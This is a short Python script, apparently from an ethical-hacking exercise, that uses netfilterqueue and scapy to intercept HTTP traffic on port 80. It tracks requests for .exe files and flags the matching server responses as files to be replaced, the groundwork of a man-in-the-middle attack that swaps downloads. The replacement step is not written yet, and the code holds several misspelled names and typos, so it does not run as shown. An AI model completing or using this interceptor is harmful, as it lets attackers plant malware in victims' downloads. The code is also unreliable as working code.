#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list = []


def process_packet(packet):
    my_packet = scapy.IP(packet.get_payload())
    if my_packet.haslayer(scapy.Raw):
        if my_packet[scapy.TCP].dport == 80:
            ack_list.append(my_packet[scapy.tcp].ack)
            if ".exe" in my_packet[scapy.Raw].load:
                print("[+] .exe Request file requested")
                print(my_packet.show())
        elif my_packet[scapy.TCP].sport == 80:
            if my_packet[scapy.tcp].sec in ack_list:
                print("[+] Replacing download file...")
                print(my_packet.show())

    packt.accept()


queue = netfilterqueue.NetfiletrQueue()
queue.bind(0, process_packet)
queue.run()
